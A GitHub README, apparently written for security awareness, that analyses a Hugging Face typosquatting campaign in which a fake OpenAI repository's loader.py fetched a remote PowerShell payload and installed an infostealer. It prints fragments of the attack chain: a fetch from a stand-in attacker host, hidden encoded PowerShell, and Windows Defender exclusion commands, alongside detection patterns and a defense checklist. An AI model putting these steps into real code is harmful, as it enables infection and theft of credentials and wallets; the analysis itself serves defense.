# 🎯 Hugging Face AI Supply Chain Attack — Security Analysis

![Type](https://img.shields.io/badge/Attack%20Type-AI%20Supply%20Chain-orange?style=flat-square)
![Platform](https://img.shields.io/badge/Platform-Hugging%20Face-yellow?style=flat-square)
![OS](https://img.shields.io/badge/OS-Windows-blue?style=flat-square)
![Severity](https://img.shields.io/badge/Severity-CRITICAL-red?style=flat-square)
![Purpose](https://img.shields.io/badge/Purpose-Educational%20Only-green?style=flat-square)
![Author](https://img.shields.io/badge/Author-Krish%20Gupta-purple?style=flat-square)

> **A full security breakdown of the Hugging Face Malicious Repository Campaign** — how attackers faked an OpenAI tool, got it trending with 244,000+ downloads, and silently stole passwords, cookies, and crypto wallets from developers who ran it.

---

## 📥 Download the Full Report

[![Download Full Report](https://img.shields.io/badge/Download-Full%20Report%20.pdf-red?style=for-the-badge&logo=adobeacrobatreader)](./AI-Supply-Chain-Attack-Report.pdf)

> Full technical + beginner-friendly analysis — attack chain, detection, defense, glossary. Everything.

---

## ⚠️ Disclaimer

This repository is strictly for **educational and security awareness purposes only**.  
All information is sourced from publicly available security research (HiddenLayer, BleepingComputer, The Hacker News, CSO Online).  
Do not use any information here on systems you do not own or have explicit written permission to test.

---

## Table of Contents

- [What Happened?](#what-happened)
- [Why It Was So Dangerous](#why-it-was-so-dangerous)
- [The Attack Chain](#the-attack-chain)
- [Key Techniques Used](#key-techniques-used)
- [Detection & Red Flags](#detection--red-flags)
- [Defense Checklist](#defense-checklist)
- [Glossary](#glossary)
- [Quick Reference](#quick-reference)
- [Sources](#sources)
- [Connect](#connect)

---

## What Happened?

Attackers created a fake repository on **Hugging Face** — the most popular platform for sharing AI models — and made it look exactly like an official **OpenAI** release.

```
Real repo:  openai/privacy-filter
Fake repo:  Open-OSS/privacy-filter   ← one small difference
```

This technique is called **Typosquatting** — slightly misspelling a trusted name to deceive users.

The fake repo hit:

- **~244,000 downloads** in under 18 hours
- **667 likes**
- **#1 trending position** on Hugging Face

All artificially inflated to exploit a simple human bias:

> *"If so many people downloaded it — it must be safe."*

It was not safe. Every person who ran `loader.py` potentially had their credentials stolen.

---

## Why It Was So Dangerous

| Factor | Why It Mattered |
|---|---|
| Trusted platform | Hugging Face is used daily by millions of developers — no suspicion |
| AI hype | Developers rush to try new AI tools — caution drops |
| Open source illusion | "Public code = reviewed code" — false assumption, exploited here |
| Multi-stage chain | Each file looked benign without the full picture |
| No exploit needed | Users ran the malware themselves — willingly |
| Scale | 244k downloads — even 1% hit means thousands of victims |

---

## The Attack Chain

```
Victim finds trending fake repo on Hugging Face
            ↓
Runs loader.py  (looks like a normal AI setup script)
            ↓
Python disables SSL verification — connects to attacker server
            ↓
Base64-encoded URL decoded — remote JSON payload fetched
            ↓
JSON contains hidden PowerShell command
            ↓
PowerShell runs silently (-WindowStyle Hidden)
            ↓
start.bat downloaded — privilege escalation begins
            ↓
UAC prompt appears — user clicks Yes (thinks it's the AI tool)
            ↓
Windows Defender exclusions added — antivirus blinded
            ↓
Rust-based infostealer installed in excluded folder
            ↓
Passwords / cookies / tokens / crypto wallets stolen
            ↓
Data exfiltrated to attacker's C2 server / Telegram bot
```

---

## Key Techniques Used

### 1. Typosquatting
Creating `Open-OSS/privacy-filter` to impersonate `openai/privacy-filter`.  
One character difference — most people miss it completely.

---

### 2. Social Proof Manipulation
Artificially inflating download counts and likes to exploit the human tendency to trust popularity.

```
244,000 downloads + 667 likes + #1 trending = "must be legit"
```

---

### 3. SSL Disabled in loader.py

```python
requests.get(url, verify=False)  # SSL verification disabled
```

Allows Python to connect to any attacker server without certificate validation.

---

### 4. Base64 Obfuscation

Normal URL:
```
https://attacker-server.com/payload
```

After Base64 encoding:
```
aHR0cHM6Ly9hdHRhY2tlci1zZXJ2ZXIuY29t
```

Hides malicious URLs from humans and simple static scanners.

---

### 5. Remote JSON Payload Delivery

```json
{
  "cmd": "powershell -WindowStyle Hidden -EncodedCommand BASE64_HERE"
}
```

The real dangerous payload was never in the repo — it was fetched at runtime.  
This means the repo could pass static analysis and be changed anytime without an update.

---

### 6. PowerShell — Hidden Execution (LOLBins)

```powershell
powershell.exe -WindowStyle Hidden -EncodedCommand <base64>
```

PowerShell is a trusted, built-in Windows tool. Running it is normal.  
**LOLBins (Living Off The Land Binaries)** = using legitimate tools maliciously.

---

### 7. Windows Defender Exclusions

```powershell
Add-MpPreference -ExclusionPath "C:\Users\User\AppData\Roaming\Updater\"
```

Not a hack. Not an exploit. An official Windows feature — abused.  
The malware installed itself in the excluded folder. Defender never scanned it again.

---

### 8. What the Infostealer Stole

| Data | How Stored | Impact |
|---|---|---|
| Browser passwords | SQLite (Login Data) | Direct account access |
| Session cookies | Browser databases | Login without password — bypasses MFA |
| Discord tokens | Local app storage | Instant account takeover |
| Crypto wallets | Wallet files + seed phrases | Funds drained |
| Autofill data | Browser profiles | Identity info, card data |
| Sensitive files | File system scan | Private keys, credentials |

> **Why are cookies more dangerous than passwords?**  
> A session cookie proves you are already logged in. Steal it → instant access, no password needed, sometimes MFA cannot stop it.

---

## Detection & Red Flags

### Code-Level Red Flags

```python
# 🚩 SSL disabled
requests.get(url, verify=False)

# 🚩 Base64 encoded strings being decoded and executed
import base64
decoded = base64.b64decode("...")

# 🚩 Launching PowerShell from Python
subprocess.run(["powershell.exe", "-WindowStyle", "Hidden", ...])
os.system("powershell ...")

# 🚩 Fetching remote payload at runtime
requests.get("https://unknown-domain.com/payload.json")
```

### PowerShell Red Flags

```powershell
# 🚩 Hidden execution
powershell.exe -WindowStyle Hidden

# 🚩 Adding Defender exclusion
Add-MpPreference -ExclusionPath "C:\SomeFolder"
Add-MpPreference -ExclusionProcess "someprocess.exe"

# 🚩 Encoded commands (hides the real instruction)
powershell.exe -EncodedCommand BASE64STRING
```

### Repository-Level Red Flags

| Signal | Why Suspicious |
|---|---|
| Account name very similar to trusted org | Typosquatting attempt |
| Account created recently with many models | Rush-published malicious content |
| 200k+ downloads appeared overnight | Artificially inflated |
| README instructs `python loader.py` or `start.bat` | Immediate code execution |
| Copied description from a real repository | Impersonation |

---

## Detection Methods

| Method | How |
|---|---|
| Static code review | Look for Base64, `verify=False`, subprocess PowerShell calls |
| PowerShell logging | Enable Script Block Logging on Windows |
| Network monitoring | Alert on unexpected outbound connections after running AI tools |
| Process monitoring | Flag `powershell.exe` with `-WindowStyle Hidden` |
| Defender event logs | Alert on `Add-MpPreference` from unexpected processes |
| Sandbox detonation | Run suspicious repos in isolated VM first |
| EDR tools | Behavioural detection catches multi-stage chains |

---

## Defense Checklist

**Before running any repository:**

- [ ] Check the owner name character by character — one letter can be a typo
- [ ] Verify the account on the official organization's website
- [ ] Check account creation date — brand new accounts are suspicious
- [ ] Read the code before running it — even a 5-minute scan helps
- [ ] Google the tool independently — does it appear on official channels?

**Technical safeguards:**

- [ ] Always run unknown code in a VM or sandbox first
- [ ] Enable PowerShell Script Block Logging
- [ ] Use an EDR tool, not just antivirus
- [ ] Enable Windows Defender Tamper Protection
- [ ] Monitor outbound network traffic from development machines
- [ ] Never run unknown installers with admin/UAC privileges

---

## If You Ran the Repository

Treat the machine as **fully compromised**. Do not attempt to clean it — reinstall.

1. Disconnect from internet immediately
2. Rotate ALL passwords from a clean device
3. Revoke all API keys and tokens
4. Move cryptocurrency to a new wallet with a new seed phrase
5. Invalidate all active browser sessions
6. Enable MFA on every account
7. Wipe and reinstall the operating system
8. Report to your organization's security team

---

## Glossary

| Term | Plain-English Meaning |
|---|---|
| Supply Chain Attack | Attacking the tools developers trust, not developers directly |
| Typosquatting | Fake name nearly identical to a trusted one — one char difference |
| LOLBins | Using legitimate Windows tools maliciously |
| Infostealer | Malware built specifically to steal credentials and tokens |
| Session Cookie | Token that proves you are logged in — stealing it = instant access |
| C2 Server | Command & Control — attacker's remote HQ receiving stolen data |
| DPAPI | Windows auto-decrypts data for current user — malware exploits this |
| Base64 | Text encoding that hides commands from casual inspection |
| Privilege Escalation | Going from normal user to admin without authorization |
| Defender Exclusions | Telling antivirus to ignore specific folders — abused here |
| Sandbox | Isolated environment to run suspicious code safely |
| EDR | Advanced security tool monitoring behaviour, not just signatures |

---

## Quick Reference

### Attack in One Line

> *Attackers created a fake OpenAI repository on Hugging Face, artificially trended it to 244k downloads, then used Python → remote JSON → PowerShell → BAT → Rust infostealer to silently steal passwords, session cookies, and crypto wallets from every developer who ran it.*

### Real-World Analogy Map

| Technical | Real World |
|---|---|
| Fake Hugging Face repo | Counterfeit medicine with real brand packaging |
| Running loader.py | Swallowing without reading the ingredients |
| Remote JSON payload | Pill phones home for further instructions |
| UAC click Yes | Handing your house keys to the stranger inside |
| Defender exclusions | Telling your security camera to ignore one room |
| Session cookie stolen | Someone copied your hotel keycard |

---

## Sources

- [HiddenLayer — Malware Found in Trending Hugging Face Repository](https://www.hiddenlayer.com/research/malware-found-in-trending-hugging-face-repository-open-oss-privacy-filter)
- [BleepingComputer — Fake OpenAI repository on Hugging Face pushes infostealer malware](https://www.bleepingcomputer.com/news/security/fake-openai-repository-on-hugging-face-pushes-infostealer-malware/)
- [The Hacker News — Fake OpenAI Privacy Filter Repo Hits #1 on Hugging Face](https://thehackernews.com/2026/05/fake-openai-privacy-filter-repo-hits-1.html)
- [CSO Online — Malicious Hugging Face model masquerading as OpenAI release hits 244k downloads](https://www.csoonline.com/article/4169407/malicious-hugging-face-model-masquerading-as-openai-release-hits-244k-downloads.html)
- [Cyber Security News — Popular Hugging Face Repo With 200K Downloads Spreads Malware](https://cyberpress.org/hugging-face-repo-spreads-malware/)
- [arXiv — Models Are Codes: Measuring Malicious Code Poisoning Attacks on Pre-trained Model Hubs](https://arxiv.org/abs/2409.09368)

---

## Connect

**Author:** Krish Gupta  
**Role:** Cybersecurity Researcher | Penetration Tester | Offensive Security Enthusiast

If you found this useful, have questions, a different point of view, or just want to talk security — reach out.

[![LinkedIn](https://img.shields.io/badge/LinkedIn-Krish%20Gupta-blue?style=for-the-badge&logo=linkedin)](https://www.linkedin.com/in/krish-gupta-bb73a72a0/)
[![GitHub](https://img.shields.io/badge/GitHub-krish--foren6-black?style=for-the-badge&logo=github)](https://github.com/krish-foren6)

> ⭐ Star this repo if it helped you understand something new — it helps more people find it.  
> 🔁 Share with anyone learning security or working with AI tools.

---

*This repository is created for educational and awareness purposes only.*  
*All analysis is based on publicly available security research.*
